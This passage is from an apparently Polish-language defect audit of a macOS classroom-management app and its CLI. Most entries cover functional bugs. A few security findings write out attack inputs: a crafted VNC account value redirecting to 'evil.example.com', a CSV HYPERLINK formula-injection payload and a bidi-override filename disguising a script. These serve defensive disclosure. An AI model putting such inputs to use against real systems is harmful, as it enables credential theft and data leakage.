W aplikacji „Wymuś zamknięcie…” wymaga potwierdzenia („Niezapisana praca uczniów przepadnie”), a `cmcrctl quit-app Nazwa [KOMP] --force` od razu wysyła SIGKILL – w terminalu bez KOMP nawet na całej pracowni. To ta sama utrata pracy co przy wylogowaniu, które w CLI pyta o potwierdzenie.

**Status:** otwarte

### APL-17

**cmcrctl updates install nie pozwala na nową wersję macOS, a komunikat odsyła do przełącznika GUI** – P2, Aplikacje, instalacja, aktualizacje, `Sources/cmcrctl/CLI.swift:540`

GUI ma „Pozwól na nową wersję macOS” (allowMajorUpgrade), a CLI zawsze wywołuje installUpdates z domyślnym false i nie ma takiej opcji (ma ją tylko ukryty _builder --major). Skrypt wypisuje w terminalu „wymaga zaznaczenia „Pozwól na nową wersję macOS””, czego w cmcrctl nie da się zrobić.

**Status:** otwarte

### CLI-03

**--help poleceń podstawowych pokazuje całą pomoc zamiast pomocy polecenia** – P2, cmcrctl, `Sources/cmcrctl/CLI.swift:119`

Dla exec, status, hosts, power, trust itd. `POLECENIE --help` wypisuje pełny tekst (127 wierszy), choć README obiecuje pomoc tego polecenia, a funkcja commandHelp już umie wyciąć jego wiersze z usage.

**Status:** otwarte

### CLI-04

**kill PID przyjmuje wiele komputerów – zabija przypadkowe procesy jako root** – P2, cmcrctl, `Sources/cmcrctl/CLI.swift:474`

PID ma sens tylko na jednym Macu, a `cmcrctl kill PID all` wysyła sudo kill -TERM/-KILL do tego samego numeru na każdym komputerze (na innych to np. loginwindow lub aplikacja ucznia z niezapisaną pracą). GUI zabija proces wyłącznie na komputerze, z którego listy pochodzi PID.

**Status:** otwarte

### CLI-05

**cmcrctl logout zawsze wylogowuje natychmiast (bootout)** – P2, cmcrctl, `Sources/cmcrctl/CLI.swift:576`

Scripts.logoutUser() ma force=true, więc `cmcrctl logout` to odpowiednik „Wyloguj natychmiast…” – sesja ucznia kończy się bez szansy na zapis. Odpowiednika zwykłego „Wyloguj” z GUI (Apple Event, aplikacje pytają o zapis) w CLI nie ma, a pomoc opisuje polecenie tylko jako „wyloguj zalogowanego użytkownika”.

**Status:** otwarte

### CLI-06

**report używa ConfigStore.loadHosts() – inna lista i brak ostrzeżenia** – P2, cmcrctl, `Sources/cmcrctl/ClassroomCommands.swift:196`

Wszystkie polecenia CLI czytają listę przez readHostsFile i ostrzegają o problemie, a report woła ConfigStore.loadHosts(): przy częściowo uszkodzonym hosts.json raportuje tylko odczytane wpisy (a przy całkiem uszkodzonym – domyślne imac01–imac15) bez żadnego ostrzeżenia, i przy okazji tworzy kopię .bak.

**Status:** otwarte

### CLI-07

**schedule set i ask nie biorą ustawień z classroom.json** – P2, cmcrctl, `Sources/cmcrctl/ClassroomCommands.swift:206`

lock bierze komunikat, tryb i czas z classroom.json, ale `schedule set` bez --on/--off stosuje wbudowany EnergySchedule() (07:45/16:30, uśpienie) oraz autorestart/womp = tak, zamiast harmonogramu i polityki zapisanych w aplikacji (config.schedule, autoRestartAfterPowerLoss, wakeOnLAN). `ask` ma stałe 120 s zamiast questionTimeoutMinutes (linia 86).

**Status:** otwarte

### CLI-08

**Nieudany zapis hosts.json zgłaszany jako sukces (kod 0)** – P2, cmcrctl, `Sources/cmcrctl/ConfigCommands.swift:54`

ConfigStore.saveHosts połyka błąd zapisu (tylko NSLog i lastSaveError, którego cmcrctl nigdy nie czyta). hosts add/set/remove/generate, rename --update-list i status (MAC) wypisują sukces i kończą się kodem 0. Przy password set --host hasło trafia do Pęku kluczy, ale flaga „własne hasło” nie zostaje zapisana, więc komputer dalej używa hasła wspólnego mimo komunikatu „Zapisano własne hasło”.

**Status:** naprawione (b5d9416). naprawione razem z KON-03

### CLI-09

**hosts generate przyjmuje przecinek w prefiksie (hosts add go odrzuca)** – P2, cmcrctl, `Sources/cmcrctl/ConfigCommands.swift:106`

Prefiks jest sprawdzany jako .sshPart, który nie zabrania przecinka, a staje się też nazwą komputera. `hosts generate "lab,b" --replace` tworzy nazwy „lab,b01”, których nie da się wskazać nazwą (przecinek dzieli listę w KOMP) i adresy „lab,b01.local”, a `hosts add "lab,b01"` ten sam wpis odrzuca.

**Status:** otwarte

### CLI-10

**hosts generate --replace nadpisuje uszkodzony hosts.json bez kopii .bak** – P2, cmcrctl, `Sources/cmcrctl/ConfigCommands.swift:122`

Przy nieczytelnym hosts.json --replace (po potwierdzeniu) zapisuje nową listę bez zachowania oryginału; wpisy, adresy MAC i grupy z uszkodzonego pliku przepadają. README obiecuje, że uszkodzony hosts.json nigdy nie jest nadpisywany (aplikacja zostawia *.bak).

**Status:** otwarte

### CLI-11

**screen-watch: ukryta --notified-user pomija komunikat dla ucznia; brak wpisu w dzienniku** – P2, cmcrctl, `Sources/cmcrctl/ScreenWatch.swift:24`

Opcja testowa --notified-user (używana w screens.sh) jest dostępna w zwykłym cmcrctl: podanie konta ucznia sprawia, że skrypt uznaje go za już powiadomionego (scr_notify: [ "$CONSOLE_USER" = "$CMCR_LAST" ] && return 0) i pobiera obraz bez komunikatu „Administrator rozpoczął podgląd”. Ponadto screen-watch i screenshot w CLI nie zapisują sesji podglądu w dzienniku działań (w CLI nie ma żadnego ConfigStore.log).

**Status:** otwarte

### CLI-12

**app-update --beta podpowiada instalację bez --beta** – P2, cmcrctl, `Sources/cmcrctl/SelfUpdateCommand.swift:102`

Po znalezieniu wersji testowej (--beta) podpowiedź brzmi „Instalacja: cmcrctl app-update install”, a bez --beta UpdateFeed sprawdza tylko /releases/latest (bez wydań testowych), więc to polecenie odpowie „jest aktualny – nie ma czego instalować”.

**Status:** otwarte

### CLI-13

**trust odrzuca -j/--prefix, a nie ma go na liście wyjątków** – P2, cmcrctl, `Sources/cmcrctl/TrustCommand.swift:15`

README i pomoc wymieniają polecenia z KOMP bez -j (wake, hosts remove, lesson, rename, setup, readiness, ask), ale trust [KOMP] także kończy się błędem „Opcja -j nie dotyczy polecenia trust” (kod 2).

**Status:** otwarte

### CLI-14

**trust: zmieniony klucz zatwierdzany razem z nowymi (jedno pytanie/--yes)** – P2, cmcrctl, `Sources/cmcrctl/TrustCommand.swift:65`

cmcrctl trust dodaje komputery ze zmienionym kluczem do tej samej listy kandydatów co nowe i potwierdza wszystkie jednym pytaniem; `trust all --yes` w skrypcie cicho ufa kluczowi urządzenia podszywającego się pod wyłączonego iMaca, a następne polecenia wysyłają mu hasło. W GUI zmieniony klucz nigdy nie jest zaznaczony z góry (HostTrustReview.setScan: chosen = state == .new).

**Status:** otwarte

### CLI-15

**Polecenia modułów nie ostrzegają o uszkodzonym settings.json** – P2, cmcrctl, `Sources/cmcrctl/main.swift:22`

Ostrzeżenia ConfigStore.loadIssues są wypisywane dopiero w linii 25, po ExtraCommands.run, który dla lesson, collect, rm, setup, readiness, rename, lock, install… kończy proces wcześniej. Przy uszkodzonym settings.json te polecenia cicho używają wartości domyślnych (np. domyślny sharedFolder przy lesson end/collect --clean).

**Status:** otwarte

### CLI-16

**Komunikat power-later odsyła do nieistniejącego przycisku „Anuluj zaplanowane”** – P2, cmcrctl, `Sources/CMCRCore/Scripts+Classroom.swift:257`

Po zaplanowaniu restartu, wyłączenia lub uśpienia skrypt wypisuje: Można to anulować przyciskiem „Anuluj zaplanowane”. W GUI przycisk nazywa się „Odwołaj” (wiersz „Zaplanowane na później”, PowerView.swift:167). W `cmcrctl power-later` ten sam tekst trafia do terminala, gdzie właściwym poleceniem jest `cmcrctl power-cancel KOMP`. Nauczyciel nie znajdzie wskazanego przycisku ani polecenia.

*Zgłoszone przez recenzenta przy weryfikacji innej pozycji; sprawdzane przy naprawie.*

**Status:** otwarte

### CLI-17

**install bierze istniejący lokalnie plik lub folder o nazwie KOMP (np. „all”) za instalator** – P2, cmcrctl, `Sources/cmcrctl/ScriptCommands.swift:33`

Ostatni argument uznaje się za KOMP tylko wtedy, gdy taki plik nie istnieje lokalnie. W katalogu ~/Public/cmcr (konwencja cmcr-helpers; Operations.prepareLocalFolders tworzy tam foldery all i <adres>) polecenie `cmcrctl install Firefox.pkg all` traktuje folder all jako instalator. Cały folder jest wysyłany na każdy iMac, a cmcr_install_dir instaluje jako root każdy znaleziony w nim .app/.pkg/.dmg (z tym samym sprawdzeniem podpisu). KOMP przepada: w terminalu cel to „wszystkie” (tylko z komunikatem na stderr), w skrypcie pojawia się błąd „Podaj komputery” mimo podanego all. Przy KOMP w postaci adresu (imac03.local, taki folder też jest w ~/Public/cmcr) polecenie trafia na wszystkie komputery zamiast na jeden, wbrew README:123.

*Zgłoszone przez recenzenta przy weryfikacji innej pozycji; sprawdzane przy naprawie.*

**Status:** otwarte

### CLI-18

**setup-script po cichu ignoruje --verify i --dry-run, więc wygenerowany plik wprowadza zmiany** – P2, cmcrctl, `Sources/cmcrctl/SetupCommands.swift:42`

`cmcrctl setup-script --help` pokazuje te same opcje co setup, w tym „--verify tylko sprawdź (nic nie zmienia)”. Parser przyjmuje --verify i --dry-run (cl.mode), ale SetupScript.standalone dostaje tylko cl.options. Dlatego `cmcrctl setup-script --verify > sprawdz.sh` daje zwykły skrypt konfigurujący, a `sudo bash sprawdz.sh` przy iMacu zmienia konfigurację: ogranicza SSH do administratorów, instaluje klucz, ustawia Wake-on-LAN i folder ucznia, zamiast tylko sprawdzić. Wbrew README:129 nieużywana opcja nie daje kodu 2.

*Zgłoszone przez recenzenta przy weryfikacji innej pozycji; sprawdzane przy naprawie.*

**Status:** naprawione (f07b2af). naprawione razem z PRZ-03/PRZ-17

### DOD-05

**Brak zgody macOS na sieć lokalną diagnozowany jako „wyłączony” dla całej pracowni** – P2, Dodatkowe przeszukanie, `Sources/CMCRCore/SSH.swift:716`

Na macOS 15+ ssh i nc uruchamiane przez aplikację podlegają zgodzie na sieć lokalną przyznanej CMCR Manager. Jeśli użytkownik kliknie „Nie zezwalaj” albo okno zgody jeszcze czeka (pierwsza runda przy starcie), connect() kończy się EHOSTUNREACH: ssh wypisuje „No route to host” (kod 255), a nc kończy się kodem 1. SSH.diagnose klasyfikuje to jako .offline z komunikatem „Komputer nie odpowiada (wyłączony lub poza siecią).”, a nazwy .local jako „Nie można odnaleźć nazwy hosta…”. applyStatus zwiększa offlineStreak i wydłuża odstęp sprawdzania, a portAnswers=false blokuje pełne sprawdzenie. „Pomiń niedostępne” (domyślnie włączone) pomija wszystkie komputery, przyciski działań są nieaktywne z podpowiedzią „Kliknij Odśwież albo wyłącz Pomiń niedostępne”. „Test połączenia”, gotowość i „Sprawdź klucz komputera” też zgłaszają „nie odpowiada”. Krok „Na tym Macu: dostęp do sieci lokalnej” w Gotowości ma na sztywno status „Dotyczy tego Maca (nie iMaców).” i attention=false (ReadinessView.swift:859, :319). Tę przyczynę rozpoznaje tylko Wake-on-LAN (Parsers.swift:82). Nauczyciel widzi 15 wyłączonych iMaców i nic nie wskazuje, że problem leży na jego Macu.

**Status:** otwarte

### DOD-06

**„Network is unreachable” (Mac nauczyciela bez sieci) pokazywany jako surowy angielski błąd ssh** – P2, Dodatkowe przeszukanie, `Sources/CMCRCore/SSH.swift:734`

Gdy Mac nauczyciela nie ma połączenia z siecią (Wi‑Fi wyłączone, odłączony kabel), ssh do iMaców o adresach IP kończy się „ssh: connect to host 10.0.5.23 port 22: Network is unreachable” (ENETUNREACH). SSH.diagnose nie ma dla tego gałęzi, więc zwraca (.error, surowy angielski stderr). Każdy komputer ma wtedy stan „Błąd połączenia” z angielskim tekstem, bez wskazówki, że chodzi o sieć tego Maca. Przy domyślnych nazwach .local ten sam stan daje „Nie można odnaleźć nazwy hosta w sieci (Bonjour/.local)” → .offline, czyli cała pracownia jako wyłączona.

**Status:** otwarte

### DOD-07

**Opóźnione wyłączenie/restart: ostrzeżenie i pominięcie zalogowanych tylko według stanu z chwili planowania** – P2, Dodatkowe przeszukanie, `Sources/CMCRCore/Scripts+Classroom.swift:256`

delayedPower pokazuje ostrzeżenie tylko użytkownikowi, który jest na konsoli w chwili planowania (l.236-239). Odłożony proces po N min wykonuje `shutdown -r/-h now` bez żadnego sprawdzenia (l.256). Komputery do pominięcia wybiera aplikacja z zapamiętanego stanu: PowerView.swift:405-410, a przy „Zakończ zajęcia” pendingSkip sprzed odliczania (ClassroomModel.swift:317, 332). Stan odświeża się co 2 min. Scenariusz: o 13:50 nauczyciel planuje „Wyłącz za 15 min” z „Uprzedź zalogowanych uczniów” i „Pomiń komputery z zalogowanym uczniem”, a imac05 stoi wtedy na oknie logowania. O 13:55 uczeń loguje się (albo wraca do sesji w tle) i pracuje. Nie dostaje żadnego komunikatu, a o 14:05 komputer wyłącza się razem z jego niezapisaną pracą. Przy natychmiastowym restarcie jest podobnie: uczeń zalogowany po ostatnim odświeżeniu widnieje jako „nikt nie jest zalogowany” i nie zostaje pominięty. Gdy przy planowaniu nikt nie był zalogowany, wynik nie mówi też, że ostrzeżenia nie pokazano.

**Status:** otwarte

### DOD-08

**„Zakończ zajęcia”: „Zamknij aplikacje” zgłasza „aplikacje zamknięte”, gdy nikt nie jest na konsoli** – P2, Dodatkowe przeszukanie, `Sources/CMCRCore/Scripts+Classroom.swift:380`

Przy pustym CONSOLE_USER quitAllApps kończy z kodem 0 (l.380), a quitApp wypisuje „Brak zalogowanego użytkownika.” i też kończy z kodem 0 (Scripts.swift:218). LessonRunner (LessonRoutine.swift:275, 279-282) uznaje to za sukces, więc tabela zajęć pokazuje „✔ aplikacje zamknięte” albo „✔ zamknięto: Pages, Keynote”. Gdy sesja ucznia działa w tle, jej aplikacje zostają otwarte bez autozapisu. Zbierane są pliki bez ostatnich zmian, a późniejszy krok „Wyłącz” te zmiany odrzuca, choć raport twierdzi, że aplikacje zamknięto. outcome() ma już ścieżkę .skipped dla kodu 3, ale te skrypty z niej nie korzystają.

**Status:** otwarte

### DOD-09

**Uprzejme „Wyloguj” uznaje sukces, gdy tylko zmieni się właściciel konsoli** – P2, Dodatkowe przeszukanie, `Sources/CMCRCore/Scripts.swift:1026`

Pętla oczekiwania po prośbie do loginwindow uznaje wylogowanie, gdy `stat -f%Su /dev/console` przestaje być równe $WHO. Scenariusz: aplikacja ucznia czeka z pytaniem o zapis (np. za blokadą ekranu) i w tym czasie ktoś klika „Przełącz użytkownika” na ekranie blokady. Konsola przechodzi na okno logowania (root), skrypt wypisuje „✔ Wylogowano student.” i kończy z kodem 0, a sesja dalej działa w tle z otwartym pytaniem. Nauczyciel nie dostaje komunikatu „nadal zalogowany – użyj „Wyloguj natychmiast””.

**Status:** naprawione (977ae3f)

### DOD-10

**Przy ProxyJump/ProxyCommand wynik nil sondy portu blokuje pełne sprawdzenie włączonego iMaca** – P2, Dodatkowe przeszukanie, `Sources/CMCRManager/AppModel.swift:543`

SSH.portAnswers zwraca nil, gdy nie da się tego stwierdzić: połączenie idzie przez ProxyJump/ProxyCommand z „Dodatkowe opcje połączenia” (UI podpowiada „np. ProxyJump=brama”) albo nc zakończył się kodem innym niż 1. AppModel porównuje wynik z `== true`, więc nil traktuje jak „port nie odpowiada”, a finishPortProbe(answered:false) pomija pełne sprawdzenie. Iloma komputer wyłączony przez kilka rund (offlineStreak 3–4, nextQuietProbe +450/+570 s) jest sprawdzany tylko przy wygaśnięciu odstępu. Po włączeniu (np. harmonogram 7:30) wraca na listę dopiero po ok. 8–10 min, a nie „w kolejnym odświeżeniu”, jak obiecuje README.

**Status:** otwarte

### DOD-11

**Adres VNC sklejany bez kodowania – „#”, „/”, „?” w koncie kierują Udostępnianie ekranu do innego hosta niż ssh** – P2, Dodatkowe przeszukanie, `Sources/CMCRManager/AppModel.swift:704`

URL budowany interpolacją "vnc://\(m.user)@\(m.address)" bez kodowania części userinfo i bez sprawdzenia SSH.refusalMessage(for:) (Terminal je sprawdza). Walidacja wpisów (HostEntry.problem .sshPart, HostValidation .invalidCharacters) przepuszcza „#”, „/”, „?”, więc wpis z importowanej listy z kontem „evil.example.com#” i adresem „imac01.local” nie dostaje ostrzeżenia, ssh łączy się z imac01.local (klucz sprawdzany), a Udostępnianie ekranu – z evil.example.com (fragment „#@imac01.local” jest odcinany). Lista komputerów pokazuje imac01.local, a hasło administratora trafia gdzie indziej. Sprawdzone: URL(string: "vnc://evil.example.com#@imac01.local").host == "evil.example.com", a dla "vnc://x/evil.example.com?@imac01.local" host == "x".

**Status:** naprawione (0d14b5c)

### DOD-12

**„Steruj ekranem” po cichu nic nie robi dla adresu IPv6 (lub z „%”) – brak komunikatu** – P2, Dodatkowe przeszukanie, `Sources/CMCRManager/AppModel.swift:704`

openScreenSharing ma tylko gałąź `if let url = URL(string: ...)` bez else, a wynik NSWorkspace.shared.open(url) jest ignorowany. Dla adresu, który ssh i walidacja wpisów akceptują (dwukropek i „%” nie są odrzucane w HostEntry.problem), np. „2001:db8::5” albo „fe80::1%en0”, URL(string:) zwraca nil. Kliknięcie „Steruj ekranem” (pasek, menu kontekstowe, inspektor, kafelki, Ściana ekranów) nie daje wtedy żadnego efektu: nie ma dźwięku, komunikatu ani wpisu w dzienniku. Terminal i wszystkie operacje SSH działają na tym samym wpisie.

*Zgłoszone przez recenzenta przy weryfikacji innej pozycji; sprawdzane przy naprawie.*

**Status:** naprawione (0d14b5c)

### DOD-13

**Znaki bidi (U+202A–202E, U+2066–2069) w nazwach plików z iMaców nie są neutralizowane w GUI** – P2, Dodatkowe przeszukanie, `Sources/CMCRManager/RemoteBrowserComponents.swift:8`

RemoteEntry.displayName („Name safe for a single line”) zamienia tylko \n i \t. Komentarz w TerminalText.swift:9 twierdzi, że widoki SwiftUI nie interpretują znaków sterujących, ale Text i CoreText stosują nadpisania kierunku tekstu (U+202A–202E, U+2066–2069). Scenariusz: uczeń nazywa plik „praca\u{202E}fdp.command”. W kolumnie Nazwa Przeglądarki, w okienku „Gdzie zapisać „…”…”, w potwierdzeniu usuwania, w tytule zadania „Pobierz „…” z imac01” (RemoteBrowserModel.swift:270, surowe entry.name) i w wyjściu zadania („✔ …/praca…”) nazwa wygląda jak „pracadnammoc.pdf”. Niezamknięte RLO odwraca też resztę wiersza, np. kolejne nazwy w potwierdzeniu usuwania kilku elementów albo „ z imac01” w tytule zadania. Razem z brakiem kwarantanny ułatwia to podsunięcie nauczycielowi skryptu jako dokumentu. Kolumna Rodzaj i ikona pokazują wprawdzie prawdziwy typ, ale tytuły zadań, komunikaty i wyjście już nie.

**Status:** otwarte

### KOM-02

**Uszkodzony classroom.json po cichu zastępowany wartościami domyślnymi** – P2, Komputery, zasilanie, `Sources/CMCRCore/Classroom.swift:432`; także: `Sources/CMCRManager/ClassroomModel.swift:142`

ClassroomStore.loadConfig przy błędzie dekodowania zwraca ClassroomConfig() bez kopii .bak i bez ostrzeżenia; pierwsza zmiana (układ kolumn tabeli Komputery, zapytanie o wersję aplikacji, dowolne ustawienie) nadpisuje plik. Tracone są harmonogram zasilania, scenariusze zajęć, komunikat trybu uwagi i układ tabeli. Wystarczy jedna wartość złego typu (ręczna edycja, inna wersja aplikacji), bo init(from:) używa try decodeIfPresent. Dla hosts.json/settings.json aplikacja robi kopię i ostrzega.

**Status:** otwarte

### KOM-03

**Wyłączone przełączniki autorestart/Wake-on-LAN niczego nie wyłączają na iMacu** – P2, Komputery, zasilanie, `Sources/CMCRCore/Scripts+Classroom.swift:297`

Przy „Zastosuj harmonogram” wyłączony przełącznik „Włącz ponownie po zaniku zasilania” lub „Budź przez sieć (Wake-on-LAN)” generuje tylko „:”, więc pmset autorestart/womp zostaje bez zmian. Nauczyciel wyłącza „Budź przez sieć”, stosuje harmonogram, a wynik pod sekcją nadal pokazuje „Wake-on-LAN: tak”. Przełączniki wyglądają jak stan ustawienia, a działają tylko jako „włącz”. To samo w CLI: schedule set --no-womp/--no-autorestart nic nie wyłącza.

**Status:** otwarte

### KOM-04

**Nieaktualny zalogowany uczeń przy wyłączonych komputerach (lista, panel, potwierdzenia)** – P2, Komputery, zasilanie, `Sources/CMCRManager/App.swift:562`

Przy nieudanym sprawdzeniu applyStatus (AppModel.swift:595) zachowuje stare info z console=…. MachineRow, HostInspector („Zalogowany”, HostInspector.swift:45) oraz ConfirmSheet/PowerConfirmSheet pokazują wtedy np. „jan” przy komputerze niedostępnym lub z błędem, wyszukiwarka znajduje go po nazwie ucznia, a w potwierdzeniu komputer z błędem liczy się jako „z zalogowanym”. Tabela Komputery celowo ukrywa to pole dla niedziałających Maców, więc widoki są sprzeczne.

**Status:** otwarte

### KOM-05

**⇧⌘O „Zaznacz włączone” i kafelek „Włączone” w trakcie odświeżania kasują zaznaczenie** – P2, Komputery, zasilanie, `Sources/CMCRManager/AppModel+Jobs.swift:101`

selectOnline i kafelek „Włączone” (DashboardView.swift:154) porównują bieżący stan z .online. Jawne odświeżenie (⌘R, start aplikacji, import listy) ustawia wszystkim .checking, więc ⇧⌘O (albo klik w kafelek „0 z 15”) w tym czasie zastępuje zapamiętane zaznaczenie pustym zbiorem. Aplikacja ma settledReachability/knownReachability właśnie na czas ponownego sprawdzania, ale tu ich nie używa.

**Status:** otwarte

### KOM-06

**Nieudany odczyt nazw/FileVault ignorowany – „sprawdzanie…” bez końca** – P2, Komputery, zasilanie, `Sources/CMCRManager/ClassroomModel.swift:521`

loadNames i checkFileVault (ClassroomModel.swift:466) przy !r.succeeded po prostu wracają. W arkuszu „Zmień nazwy komputerów” włączony komputer z błędem (złe hasło, niezaufany klucz, limit czasu) ma w kolumnie „Obecnie” na stałe „sprawdzanie…”, a w panelu szczegółów po „Sprawdź teraz” FileVault zostaje „nie sprawdzono” bez podania przyczyny.

**Status:** otwarte

### KOM-07

**Po zmianie nazwy z aktualizacją listy komputer traci zaufany klucz SSH** – P2, Komputery, zasilanie, `Sources/CMCRManager/ClassroomModel.swift:548`

rename (i cmcrctl rename --update-list) zmienia adres na <nowa>.local, a known_hosts zna klucz tylko pod starym adresem (HostTrust.knownHostsName = adres). Każde kolejne połączenie jest odrzucane jako „klucz nie jest jeszcze zaufany”, okno zaufania pojawia się dopiero przy następnym odświeżeniu (do 2 min) i każe ponownie potwierdzić odciski wszystkich przemianowanych iMaców; arkusz ostrzega tylko o zmianie adresu.

**Status:** otwarte

### KOM-08

**Kliknięcie kafelka z liczbą 0 kasuje zaznaczenie komputerów** – P2, Komputery, zasilanie, `Sources/CMCRManager/DashboardView.swift:185`

Akcja kafelka to model.selection = ids także dla pustego zbioru („Wymaga uwagi 0”, „Mało miejsca na dysku 0”). Kafelek nie jest wyłączony, a kliknięcie usuwa przygotowane (i zapamiętywane) zaznaczenie bez możliwości cofnięcia.

**Status:** otwarte

### KOM-09

**Kliknięcie wiersza w tabeli „Komputery” zastępuje zaznaczenie (cele działań)** – P2, Komputery, zasilanie, `Sources/CMCRManager/DashboardView.swift:228`

Tabela działu Komputery ma selection: $model.selection, więc zwykłe kliknięcie wiersza (np. żeby zobaczyć szczegóły) zamienia zaznaczone pola wyboru na ten jeden komputer, a dwuklik i „Pokaż szczegóły” robią selection = [id]. README opisuje zasadę odwrotną (kliknięcie tylko podświetla), działającą na liście obok. Scenariusz: zaznaczonych 12 komputerów, klik w wiersz imac03 w Komputerach, potem w Zajęciach „Zablokuj ekrany” obejmuje już tylko imac03.

**Status:** otwarte

### KOM-10

**Panel szczegółów: „Harmonogram zasilania: nie sprawdzono”, choć stan zawiera harmonogram** – P2, Komputery, zasilanie, `Sources/CMCRManager/HostInspector.swift:138`

Scripts.status przy każdym odświeżeniu zwraca power_schedule, womp i autorestart (HostStatus.powerSchedule/wakeOnLANEnabled/autoRestartEnabled), ale nic w aplikacji tego nie używa. scheduleText bierze wyłącznie classroom.schedules, wypełniane dopiero po „Sprawdź teraz”/„Sprawdź obecny”, więc po uruchomieniu każdy komputer ma „nie sprawdzono” (FileVault ma fallback na status, harmonogram nie).

**Status:** otwarte

### KOM-11

**Błędna odmiana „Sprawdzanie… (N pozostało)”** – P2, Komputery, zasilanie, `Sources/CMCRManager/HostInspector.swift:424`

Podsumowanie arkusza „Wersje aplikacji” skleja liczbę z „pozostało”: dla 1 i 2–4 (22–24…) forma jest błędna („2 pozostało” zamiast „pozostały 2”, „1 pozostało” zamiast „pozostał 1”).

**Status:** otwarte

### KOM-12

**Ostrzeżenie o FileVault przed restartem pomija automatyczne odblokowanie** – P2, Komputery, zasilanie, `Sources/CMCRManager/PowerView.swift:302`

PowerConfirmSheet zawsze pisze, że po restarcie komputer zatrzyma się na ekranie odblokowania i będzie niedostępny, choć Scripts.power(.restart)/delayedPower uzbrajają fdesetup authrestart, gdy zapisane hasło należy do konta FileVault (README). checkFileVault odbiera authrestart=yes/no, ale model zapisuje tylko fv, więc ostrzeżenie straszy także tam, gdzie restart przebiegnie bez interwencji.

**Status:** otwarte

### KOM-13

**cmcrctl status zapisuje MAC trasy domyślnej, cmcrctl wake nie preferuje Ethernetu ani nie czeka** – P2, Komputery, zasilanie, `Sources/cmcrctl/CLI.swift:330`

rememberMACs (komentarz „Like the app”) bierze klucz mac (interfejs trasy domyślnej, np. Wi‑Fi), a aplikacja zapisuje HostStatus.mac = mac_ethernet ?? mac. Na iMacu z Wi‑Fi jako trasą domyślną lista dostaje MAC karty Wi‑Fi, a cmcrctl wake (CLI.swift:616) wysyła pakiety tylko na h.macAddress (bez mac_ethernet ze status-cache i rozgłoszenia podsieci) i nie czeka na odpowiedź – inaczej niż aplikacja i opis Wake-on-LAN w README.

**Status:** otwarte

### KOM-14

**Eksport CSV nie neutralizuje formuł – dane kontrolowane przez ucznia wykonują się w arkuszu** – P2, Komputery, zasilanie, `Sources/CMCRCore/Classroom.swift:563`

CSV.escape cytuje tylko separator, cudzysłowy i znaki nowej linii; pole zaczynające się od =, +, -, @ trafia do pliku dosłownie. W „Porównaj wersje aplikacji” wersja i kompilacja (HostInspector.swift:445-456) pochodzą z Info.plist pakietów wyszukiwanych także w /Users/$CONSOLE_USER/Applications (Scripts+Classroom.swift:352-366), który kontroluje uczeń. Gdy aplikacji nie ma w /Applications, uczeń może podsunąć np. CFBundleShortVersionString „=HYPERLINK("https://…/?"&A2;"6.0")”. README każe otwierać raporty w Excelu, a ten po otwarciu pliku potraktuje pole jako formułę. Ta sama funkcja eksportuje odpowiedzi uczniów (ClassroomView.swift:742), czyli tekst wpisany przez ucznia wprost. Wpływ ograniczony (na Macu brak DDE, link wymaga kliknięcia), stąd P2.

*Zgłoszone przez recenzenta przy weryfikacji innej pozycji; sprawdzane przy naprawie.*

**Status:** otwarte

### KOM-15

**„Zmień nazwy komputerów” nie wykrywa kolizji z nazwami niezaznaczonych komputerów** – P2, Komputery, zasilanie, `Sources/CMCRManager/HostInspector.swift:282`

Właściwość duplicates sprawdza powtórzenia tylko wśród entries, czyli zaznaczonych komputerów. Scenariusz: zaznaczony imac03, nowa nazwa „imac04” (literówka), imac04 jest na liście, ale niezaznaczony. Arkusz nie ostrzega, „Zmień nazwy (1)” jest aktywny, a macOS rozwiązuje konflikt Bonjour, nadając przemianowanemu Macowi imac04-2. Przy włączonej aktualizacji listy wpis dawnego imac03 dostaje nazwę imac04 i adres imac04.local (ClassroomModel.swift:548-551). Klucz pod imac04.local jest zaufany, więc wszystkie następne działania wysłane do tego wpisu trafiają do prawdziwego imac04. HostValidation pokazuje duplikat tylko w Konfiguracji › Komputery i nie blokuje działań.

*Zgłoszone przez recenzenta przy weryfikacji innej pozycji; sprawdzane przy naprawie.*

**Status:** otwarte

### KON-07

**Poprawny adres MAC bez separatorów oznaczany jako błędny** – P2, Konfiguracja, `Sources/CMCRCore/HostValidation.swift:27`

isValidMAC wymaga 6 grup rozdzielonych „:” lub „-”, więc „a483e7123456” albo „a483.e712.3456” wpisane w kolumnie Adres MAC dostaje ostrzeżenie „Adres MAC ma zły format”, choć Wake-on-LAN (WakeOnLAN.parseMAC) i cmcrctl (HostEntry.normalizedMAC) go akceptują. Aplikacja nie normalizuje też wpisanego MAC jak CLI.

**Status:** otwarte

### KON-08

**Pusta zmienna CMCR_CONFIG_DIR przenosi dziennik działań w inne miejsce** – P2, Konfiguracja, `Sources/CMCRCore/Store.swift:18`

directory ignoruje pustą CMCR_CONFIG_DIR, a logURL sprawdza tylko != nil. Przy `CMCR_CONFIG_DIR=` (np. niezdefiniowana zmienna w skrypcie) konfiguracja jest domyślna, ale dziennik trafia do ~/Library/Application Support/CMCRManager/actions.log zamiast ~/Library/Logs/CMCRManager/actions.log, więc część działań z cmcrctl nie trafia do dziennika pokazywanego w aplikacji.

**Status:** otwarte

### KON-09

**Baner „Nie zapisano hasła administratora” przy samych hasłach „własnych”** – P2, Konfiguracja, `Sources/CMCRManager/ActivityViews.swift:334`

PasswordBanner.isNeeded sprawdza tylko hasło wspólne. W pracowni, w której każdy iMac ma własne hasło (README: wspólne lub per komputer), pomarańczowy baner na każdej stronie twierdzi, że instalacje i aktualizacje nie zadziałają.

**Status:** otwarte

### KON-10

**Pozycje menu „Przejdź” i „Konfiguracja…” nic nie robią, gdy główne okno jest zamknięte** – P2, Konfiguracja, `Sources/CMCRManager/App.swift:77`

Polecenia ustawiają tylko model.section. Po zamknięciu okna w trakcie zadań (aplikacja działa dalej) albo gdy na wierzchu jest okno Ustawień lub Ściana ekranów, ⌘1…⌘0, ⇧⌘P i ⌘, nie pokazują głównego okna – zmiana jest niewidoczna.

**Status:** otwarte

### KON-11

**Widoczność kolumny Port nie jest zapamiętywana** – P2, Konfiguracja, `Sources/CMCRManager/SetupView.swift:73`

columns to @State w HostsEditor – po przejściu do innej zakładki lub działu i powrocie kolumna Port znów jest ukryta. Dział Komputery zapisuje układ kolumn (DashboardView.swift:345-349).

**Status:** otwarte

### KON-12

**Kolumna Hasło pokazuje „Własne” także, gdy własnego hasła nie ma w Pęku kluczy** – P2, Konfiguracja, `Sources/CMCRManager/SetupView.swift:184`

